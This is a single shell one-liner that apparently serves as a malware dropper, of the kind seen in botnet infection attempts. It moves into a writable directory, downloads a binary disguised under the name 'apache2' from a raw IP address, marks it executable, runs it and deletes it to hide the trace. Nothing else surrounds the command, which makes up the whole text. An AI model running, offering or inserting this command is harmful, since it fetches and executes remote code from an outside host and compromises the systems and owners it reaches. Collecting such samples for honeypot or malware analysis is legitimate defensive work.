cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.231.77/apache2; chmod +x apache2; ./apache2; rm -rf apache2
